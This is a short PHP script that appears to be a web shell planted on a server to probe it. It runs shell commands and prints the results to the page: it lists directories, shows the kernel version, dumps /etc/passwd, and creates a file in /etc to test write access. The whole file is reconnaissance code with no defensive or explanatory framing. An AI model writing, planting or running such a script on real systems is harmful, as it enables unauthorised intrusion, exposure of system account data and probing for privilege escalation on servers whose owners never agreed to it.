<?php
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";

$output = shell_exec('uname -a');
echo "<pre>$output</pre>";

$output = shell_exec('cat /etc/passwd');
echo "<pre>$output</pre>";


echo "<pre>*******</pre>";
$output = shell_exec('ls -lart /etc/');
echo "<pre>$output</pre>";
echo "<pre>******</pre>";


echo "<pre>####### 1</pre>";
$output = shell_exec('touch /etc/test.sh');
echo "<pre>####### 2</pre>";
$output = shell_exec('ls /etc/test.sh');
echo "<pre>$output</pre>";
echo "<pre>####### 3</pre>";

?>
